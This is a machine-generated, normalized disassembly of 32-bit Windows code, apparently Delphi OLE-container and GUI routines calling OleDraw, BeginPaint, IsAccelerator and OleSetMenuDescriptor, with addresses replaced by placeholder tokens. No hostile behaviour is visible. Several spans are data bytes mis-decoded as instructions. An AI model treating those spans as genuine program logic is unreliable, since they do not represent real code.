lea eax [ ebp - 0x8 ]
call sub_40599c
retn
push 0xffffffff
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
push eax
mov eax [ eax ]
call [ eax + 0x14 ]
sub_466c7c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_466d5e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x248 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_466d65
lea eax [ ebp - 0x10 ]
call sub_40599c
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x248 ] 0x1
xor eax eax
push ebp
push sub_466d41
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x244 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x248 ] 0x0
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x244 ]
mov edx ebx
call sub_41a19c
mov edi eax
mov edx [ ebp - 0xc ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x8 ]
lea edx [ ebp - 0x10 ]
mov eax edi
call sub_463b78
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_466a84
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
mov eax [ eax + 0x40 ]
mov eax [ eax + ebx * 4 ]
cmp eax [ ebp - 0x8 ]
jne r-xdata
sub_466d6c
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
lea eax [ ebp - 0x30 ]
mov edx [ r-xdata ]
call sub_404904
xor eax eax
push ebp
push sub_466e13
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_465a98
mov [ ebp - 0x10 ] esi
mov eax rw-data
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x1
mov [ ebp - 0x4 ] 0x1
cmp [ esi ] 0x9
je r-xdata
mov eax 0x8
mov eax 0x4
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_466e1a
lea eax [ ebp - 0x30 ]
mov edx [ r-xdata ]
call sub_4049d4
retn
lea edx [ ebp - 0x30 ]
call sub_462818
push 0x0
lea edx [ ebp - 0x30 ]
push edx
push 0x0
lea edx [ ebp - 0x10 ]
push edx
push eax
push 0x0
mov eax [ rw-data ]
push eax
push edi
mov eax [ ebx + 0x224 ]
push eax
mov eax [ eax ]
call [ eax + 0x18 ]
test eax eax
je r-xdata
sub_466e24
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov [ ebp - 0x10 ] 0x8
mov eax edi
call sub_404d94
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_466e74
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x10 ]
mov edx esi
mov eax ebx
call sub_466d6c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_466e7b
mov eax [ ebp - 0x8 ]
push eax
call SysFreeString
retn
sub_466e84
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov eax esi
call sub_4576d8
mov edi eax
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
cmp esi [ edi + 0x27c ]
jne r-xdata
mov eax [ edi + 0x27c ]
test eax eax
je r-xdata
xor eax eax
mov [ edi + 0x27c ] eax
mov [ edi + 0x27c ] esi
jmp r-xdata
cmp esi eax
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb02a
call sub_441a58
sub_466ed4
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_466f22
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x10 ]
mov edx edi
call sub_413978
lea ecx [ ebp - 0x10 ]
mov edx esi
mov eax ebx
call sub_466b94
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_466f29
lea eax [ ebp - 0x10 ]
call sub_40f188
retn
sub_466f30
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi edx
mov [ ebp - 0x4 ] eax
mov ebx [ ecx ]
xor eax eax
push ebp
push j_sub_4036bc
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
add eax 0x25f
cmp eax 0x7
ja r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
jmp [ eax * 4 + jump_table_466f65 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov si 0xffeb
call sub_403418
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffe9
call sub_403418
jmp r-xdata
cmp [ ecx + 0x8 ] 0x2
jl r-xdata
cmp [ ecx + 0x8 ] 0x0
jle r-xdata
cmp [ ecx + 0x8 ] 0x4
jl r-xdata
lea eax [ ebx + 0x10 ]
call sub_40fda4
mov [ ebp - 0xe ] ax
mov eax ebx
call sub_40fda4
mov edi eax
sub esi 0xfffffda4
je r-xdata
mov eax ebx
call sub_40fda4
mov [ ebp - 0xf ] al
lea edx [ ebp - 0xf ]
mov eax [ ebp - 0x4 ]
mov si 0xffba
call sub_403418
test [ ebx + 0x1 ] 0x40
je r-xdata
lea eax [ ebx + 0x30 ]
call sub_40fda4
mov edi eax
and edi 0x7
lea eax [ ebx + 0x20 ]
call sub_40fda4
and eax 0x7
mov [ ebp - 0xc ] eax
mov al [ edi + rw-data ]
mov [ ebp - 0x6 ] al
mov al [ edi + rw-data ]
mov edx [ ebp - 0xc ]
or al [ edx + rw-data ]
mov [ ebp - 0x5 ] al
lea eax [ ebx + 0x10 ]
call sub_40fda4
mov edi eax
mov eax ebx
call sub_40fda4
mov [ ebp - 0xc ] eax
sub esi 0xfffffda1
je r-xdata
and edi 0x7
mov cl [ edi + rw-data ]
lea edx [ ebp - 0xe ]
mov eax [ ebp - 0x4 ]
mov si 0xffbb
call sub_403418
sub esi 0x2
jne r-xdata
mov eax [ ebx + 0x8 ]
mov dl [ ebp - 0xf ]
mov [ eax ] dl
jmp r-xdata
push edi
mov eax [ ebp - 0xc ]
push eax
mov cl [ ebp - 0x5 ]
mov dl [ ebp - 0x6 ]
mov eax [ ebp - 0x4 ]
mov si 0xffd3
call sub_403418
dec esi
je r-xdata
mov eax [ ebx + 0x18 ]
mov dx [ ebp - 0xe ]
mov [ eax ] dx
jmp r-xdata
test [ ebx + 0x11 ] 0x40
je r-xdata
and edi 0x7
mov cl [ edi + rw-data ]
lea edx [ ebp - 0xe ]
mov eax [ ebp - 0x4 ]
mov si 0xffbc
call sub_403418
jmp r-xdata
mov eax [ ebp - 0xc ]
push eax
mov ecx edi
mov dl [ ebp - 0x5 ]
mov eax [ ebp - 0x4 ]
mov si 0xffd4
call sub_403418
jmp r-xdata
dec esi
jne r-xdata
push edi
mov eax [ ebp - 0xc ]
push eax
mov cl [ ebp - 0x5 ]
mov dl [ ebp - 0x6 ]
mov eax [ ebp - 0x4 ]
mov si 0xffd5
call sub_403418
jmp r-xdata
sub_46712c
push ebx
push esi
add esp 0xffffffe4
mov esi edx
mov ebx eax
mov eax [ esi ]
cmp eax 0xbd00
jb r-xdata
mov eax [ esi ]
sub eax 0xb008
je r-xdata
cmp eax 0xbd08
ja r-xdata
cmp [ ebx + 0x59 ] 0x0
je r-xdata
dec eax
je r-xdata
cmp [ ebx + 0x230 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_444aa0
cmp [ ebx + 0x220 ] 0x0
je r-xdata
cmp [ ebx + 0x5a ] 0x0
je r-xdata
jmp r-xdata
mov eax ebx
call sub_4470c4
mov [ esp ] eax
mov eax [ esi ]
sub eax 0xbc00
mov [ esp + 0x4 ] eax
mov eax [ esi + 0x4 ]
mov [ esp + 0x8 ] eax
mov eax [ esi + 0x8 ]
mov [ esp + 0xc ] eax
call GetMessageTime
mov [ esp + 0x10 ] eax
mov [ esp + 0x14 ] 0x115de1f1
mov [ esp + 0x18 ] 0x115de1f1
push esp
mov eax [ ebx + 0x230 ]
push eax
mov eax [ eax ]
call [ eax + 0x14 ]
test eax eax
jne r-xdata
push 0xfffffd41
mov eax [ ebx + 0x220 ]
push eax
mov eax [ eax ]
call [ eax + 0x14 ]
push 0xfffffd40
mov eax [ ebx + 0x220 ]
push eax
mov eax [ eax ]
call [ eax + 0x14 ]
jmp r-xdata
cmp [ ebx + 0x220 ] 0x0
je r-xdata
mov [ esi + 0xc ] 0x1
jmp r-xdata
push 0xfffffd43
mov eax [ ebx + 0x220 ]
push eax
mov eax [ eax ]
call [ eax + 0x14 ]
add esp 0x1c
pop esi
pop ebx
retn
sub_467214
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x214 ] 0x0
setne [ ebp - 0x5 ]
xor eax eax
push ebp
push j_sub_4037e8#2
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_4672d3
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x5 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x214 ]
push eax
call GlobalLock
mov ebx eax
xor eax eax
push ebp
push sub_4672b0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x214 ]
push eax
call GlobalSize
mov ecx eax
mov edx ebx
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4672b7
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x214 ]
push eax
call GlobalUnlock
retn
mov eax [ ebp - 0x4 ]
call sub_465f28
sub_4672da
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4672e9
add [ eax ] eax
add [ eax ] al
js r-xdata
hlt
inc eax
add ch dh
jb r-xdata
mov eax eax
push ebx
push esi
push edi
add esp 0xffffffb0
mov edi edx
mov ebx eax
test [ ebx + 0x23d ] 0x4
je r-xdata
add [ ecx - 0x742c743d ] cl
inc ebp
cld
mov ecx [ eax ]
call [ ecx + 0xd8 ]
test al al
jne r-xdata
mov edx edi
mov eax ebx
call sub_44521c
mov esi [ edi + 0x4 ]
test esi esi
jne r-xdata
call sub_403a24
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
call sub_4039d0
lea edx [ esp + 0x40 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x40 ]
push eax
push esi
push 0x1
mov eax [ ebx + 0x218 ]
push eax
call OleDraw
cmp [ edi + 0x4 ] 0x0
jne r-xdata
push esp
mov eax ebx
call sub_4470c4
push eax
call BeginPaint
mov esi eax
add esp 0x50
pop edi
pop esi
pop ebx
retn
push esp
mov eax ebx
call sub_4470c4
push eax
call EndPaint
jmp r-xdata
sub_46731c
push esi
mov esi eax
test [ esi + 0x23d ] 0x4
jne r-xdata
mov eax esi
call sub_4454e0
pop esi
retn
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
sub_4673ac
push ebx
push esi
push edi
push ebp
mov ebp edx
mov esi eax
mov eax esi
call sub_4576d8
mov edi eax
xor ebx ebx
mov eax edi
mov edx [ r-xdata ]
call sub_4033a8
test al al
je r-xdata
test ebx ebx
je r-xdata
mov ebx edi
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp + 0x4 ]
push eax
mov eax [ esi + 0x230 ]
push eax
mov eax [ eax ]
call [ eax + 0x1c ]
cmp [ ebp + 0x4 ] 0x0
jne r-xdata
push 0x0
push 0x0
push 0x0
push esi
call sub_467c4c
sub_467408
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4465c0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
test [ eax + 0x2c ] 0x1
je r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x249 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_4473c8
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x249 ] 0x1
xor eax eax
push ebp
push sub_467481
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x70 ]
mov edx 0xfffffe0b
mov eax [ ebp - 0x4 ]
call sub_466a7c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x249 ] 0x0
retn
sub_46748c
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_446578
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
test [ eax + 0x2c ] 0x8
je r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24b ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_4473c8
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x24b ] 0x1
xor eax eax
push ebp
push sub_46750b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x50 ]
neg al
sbb ecx ecx
mov edx 0xfffffdfe
mov eax [ ebp - 0x4 ]
call sub_466b68
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x24b ] 0x0
retn
sub_467518
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_46760d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4465e8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
test [ eax + 0x2c ] 0x6
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_467614
lea eax [ ebp - 0x14 ]
call sub_40f188
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24a ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_4473c8
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x24a ] 0x1
xor eax eax
push ebp
push sub_4675f0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
test [ eax + 0x2c ] 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
test [ eax + 0x2c ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
mov ecx [ eax + 0x18 ]
mov edx 0xfffffdff
mov eax [ ebp - 0x4 ]
call sub_466a9c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x24a ] 0x0
retn
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
call sub_465558
lea ecx [ ebp - 0x14 ]
mov edx 0xfffffe00
mov eax [ ebp - 0x4 ]
call sub_466ed4
sub_467618
push ebx
push esi
push edi
add esp 0xffffffd0
mov edi edx
mov ebx eax
mov eax ebx
mov si 0xffb8
call sub_403418
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_446508
mov [ esp + 0x4 ] 0x10
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x220 ]
push eax
mov eax [ eax ]
call [ eax + 0xc ]
test eax eax
jne r-xdata
cmp [ esp + 0xc ] 0x0
je r-xdata
lea eax [ esp + 0x14 ]
xor ecx ecx
mov edx 0x1c
call sub_402c30
mov eax ebx
call sub_4470c4
mov [ esp + 0x14 ] eax
mov [ esp + 0x18 ] 0x100
mov eax [ edi + 0x4 ]
mov [ esp + 0x1c ] eax
mov eax [ edi + 0x8 ]
mov [ esp + 0x20 ] eax
push esp
lea eax [ esp + 0x18 ]
push eax
movzx eax [ esp + 0x14 ]
push eax
mov eax [ esp + 0x14 ]
push eax
call IsAccelerator
test eax eax
je r-xdata
lea eax [ esp + 0x14 ]
push eax
mov eax [ ebx + 0x220 ]
push eax
mov eax [ eax ]
call [ eax + 0x10 ]
mov [ edi + 0xc ] 0x1
jmp r-xdata
add esp 0x30
pop edi
pop esi
pop ebx
retn
sub_4676d0
push ebx
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_4576d8
test eax eax
je r-xdata
mov edx esp
mov eax ebx
call sub_440244
push esp
mov eax ebx
call sub_446ec0
push eax
push 0x0
mov eax ebx
test eax eax
je r-xdata
cmp ebx [ eax + 0x27c ]
je r-xdata
push eax
push 0x0
push 0xfffffffc
mov eax [ ebx + 0x218 ]
push eax
mov eax [ eax ]
call [ eax + 0x2c ]
sub eax 0xfffffd9c
add esp 0x10
pop ebx
retn
sub_467720
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_4576d8
mov esi eax
test esi esi
je r-xdata
cmp [ ebx + 0x22c ] 0x0
je r-xdata
cmp ebx [ esi + 0x27c ]
jne r-xdata
test esi esi
je r-xdata
mov eax [ ebx + 0x22c ]
push eax
mov eax [ eax ]
call [ eax + 0x18 ]
pop esi
pop ebx
retn
cmp ebx [ esi + 0x220 ]
jne r-xdata
push 0x0
push ebx
call sub_467b14
sub_467768
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_4032d0
test al al
je r-xdata
mov eax 0x80004002
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn 0xc
sub_46781c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov ebx [ ebp + 0x8 ]
lea eax [ ebp - 0xc ]
push eax
push 0x1
mov eax [ ebx + 0x218 ]
push eax
mov eax [ eax ]
call [ eax + 0x48 ]
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
push 0x9ec
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x40 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call MulDiv
mov esi eax
push 0x9ec
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x40 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call MulDiv
mov edi eax
test [ ebx + 0x23d ] 0x4
je r-xdata
push esi
push edi
mov ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x40 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x84 ]
cmp [ ebx + 0x220 ] 0x0
jne r-xdata
cmp esi 0x20
jle r-xdata
cmp edi 0x20
jle r-xdata
mov esi 0x20
mov edi 0x20
sub_4678f0
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ ebp + 0x10 ]
mov ebx [ ebp + 0xc ]
test [ ebp + 0x14 ] 0x4
je r-xdata
fld [ esi ]
fmul [ r-xdata ]
mov eax [ rw-data ]
mov eax [ eax ]
fild [ eax + 0x40 ]
fdivp st1
call sub_4029ec
mov [ ebx ] eax
fld [ esi + 0x4 ]
fmul [ r-xdata ]
mov eax [ rw-data ]
mov eax [ eax ]
fild [ eax + 0x40 ]
fdivp st1
call sub_4029ec
mov [ ebx + 0x4 ] eax
push 0x9ec
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x40 ]
push eax
mov eax [ ebx ]
push eax
call MulDiv
mov [ ebp - 0x4 ] eax
fild [ ebp - 0x4 ]
fstp [ esi ]
fwait
push 0x9ec
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x40 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call MulDiv
mov [ ebp - 0x4 ] eax
fild [ ebp - 0x4 ]
fstp [ esi + 0x4 ]
fwait
jmp r-xdata
xor eax eax
pop esi
pop ebx
pop ecx
pop ebp
retn 0x10
sub_4679c0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
xor edi edi
mov eax ebx
call sub_446ec0
mov [ esi ] eax
cmp [ esi ] 0x0
jne r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
mov edi 0x80004005
sub_4679f8
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
lea eax [ ebx + 0x22c ]
call sub_40599c
push eax
push r-xdata
mov eax [ ebx + 0x218 ]
push eax
mov eax [ eax ]
call [ eax ]
lea eax [ ebx + 0x230 ]
call sub_40599c
push eax
push r-xdata
mov eax [ ebx + 0x218 ]
push eax
mov eax [ eax ]
call [ eax ]
xor eax eax
pop ebx
pop ebp
retn 0x4
sub_467a3e
add [ eax ] al
adc eax [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
rol [ eax ] 0x0
add [ eax ] al
add [ eax ] al
inc esi
pop ss
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add al al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov dl 0x1
call sub_466e84
xor eax eax
pop ebp
retn 0x4
sub_467a74
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi [ ebp + 0x1c ]
mov ebx [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
xor edx edx
mov [ eax ] edx
mov eax [ ebp + 0xc ]
mov edx ebx
test edx edx
je r-xdata
xor edx edx
mov [ eax ] edx
call sub_4059b4
mov eax [ ebp + 0x10 ]
call sub_40599c
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_440244
mov eax [ ebp + 0x14 ]
push esi
lea esi [ ebp - 0x10 ]
mov edi eax
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
push 0x7fff
push 0x7fff
push 0x0
push 0x0
mov eax [ ebp + 0x18 ]
push eax
call SetRect
xor eax eax
mov [ esi + 0x4 ] eax
mov eax ebx
call sub_446ed8
mov [ esi + 0x8 ] eax
xor eax eax
mov [ esi + 0xc ] eax
xor eax eax
mov [ esi + 0x10 ] eax
xor eax eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x18
sub edx 0xfffffda8
sub_467b14
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push 0x0
push 0x0
push 0x0
push ebx
call sub_467c4c
xor edx edx
mov eax ebx
call sub_466e84
xor eax eax
pop ebx
pop ebp
retn 0x8
sub_467c0c
push ebp
mov ebp esp
add esp 0xfffffff4
mov eax [ ebp + 0x8 ]
call sub_466380
test eax eax
je r-xdata
xor eax eax
mov esp ebp
pop ebp
retn 0xc
push 0x2
mov edx [ ebp + 0x10 ]
push edx
push 0x5
xor edx edx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] 0x2
mov [ ebp - 0x4 ] 0x4
lea ecx [ ebp - 0xc ]
mov edx [ ebp + 0xc ]
call sub_454828
sub_467c4c
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
call sub_466380
mov ebx eax
xor eax eax
test ebx ebx
je r-xdata
pop ebx
pop ebp
retn 0x10
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_454878
push 0x0
push 0x0
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebx + 0x38 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
call OleSetMenuDescriptor
sub_467d50
push edi
jle r-xdata
rol [ eax ] 0x1
add [ eax ] al
lea edx [ ebp - 0x10 ]
mov eax [ esi + 0x8 ]
call sub_465620
lea edx [ ebp - 0x10 ]
mov eax ebx
add [ esi + edi * 2 + 0x46 ] cl
add [ edx + 0x7e ] ah
inc esi
push ebp
add [ esi ] ah
jle r-xdata
call sub_40f49c
jmp sub_467e6e
add [ ebx ] dl
jle r-xdata
add [ edx + 0x7e ] ah
inc esi
add [ edx + 0x7e ] ah
inc esi
add [ eax ] cl
jle r-xdata
or eax [ eax + 0x7400597e ]
add eax 0xeb68708b
add ecx [ ebx + 0x558d6876 ]
add dh dh
jge r-xdata
add [ ecx + 0x7e ] al
inc esi
add [ esi ] dh
jle r-xdata
add [ ebp + eax - 0x75 ] dh
add ch ah
jge r-xdata
call sub_41374c
jmp sub_467e6e
jmp r-xdata
jo r-xdata
add [ edi - 0x62ffb983 ] dh
jge r-xdata
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_465558
lea edx [ ebp - 0x20 ]
mov eax ebx
call sub_40f49c
jmp sub_467e6e
loopne r-xdata
push ebp
add [ ebp + edi * 2 - 0x3c74ffba ] cl
mov edx [ esi + 0x70 ]
mov cl 0xfc
call sub_41357c
jmp sub_467e6e
sub_467ea4
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_4680a8
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push j_sub_4037e8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0xc ]
sub eax 0xfffffdfe
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x24b ] 0x0
jne r-xdata
dec eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + 0x24b ] 0x1
xor eax eax
push ebp
push sub_467fa7
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx 0xfffffdfe
mov eax [ ebp + 0x8 ]
call sub_4663d0
cmp ax 0x1
sbb edx edx
inc edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x64 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + 0x24b ] 0x0
retn
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x24a ] 0x0
jne r-xdata
dec eax
je r-xdata
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4680af
lea eax [ ebp - 0x10 ]
call sub_40f188
retn
mov eax [ ebp + 0x8 ]
mov [ eax + 0x24a ] 0x1
xor eax eax
push ebp
push sub_468069
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx 0xfffffdff
mov eax [ ebp + 0x8 ]
call sub_46636c
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x68 ]
call sub_422eb8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + 0x24a ] 0x0
retn
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x24a ] 0x0
jne r-xdata
sub eax 0xb
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + 0x24a ] 0x1
xor eax eax
push ebp
push sub_46800c
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x10 ]
mov edx 0xfffffe00
mov eax [ ebp + 0x8 ]
call sub_4664f0
lea eax [ ebp - 0x10 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x68 ]
call sub_4655a4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + 0x24a ] 0x0
retn
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x249 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + 0x249 ] 0x1
xor eax eax
push ebp
push sub_467f44
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx 0xfffffe0b
mov eax [ ebp + 0x8 ]
call sub_46636c
mov edx eax
mov eax [ ebp + 0x8 ]
call sub_440a44
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + 0x249 ] 0x0
retn
sub_46807f
add [ eax ] eax
add [ eax ] al
mov [ ecx ] ds
inc esi
add [ ebx - 0x17ffb980 ] cl
xchg esp eax
mov ecx 0xdb33fff9
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4680af
lea eax [ ebp - 0x10 ]
call sub_40f188
retn
sub_4680e0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_468111
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
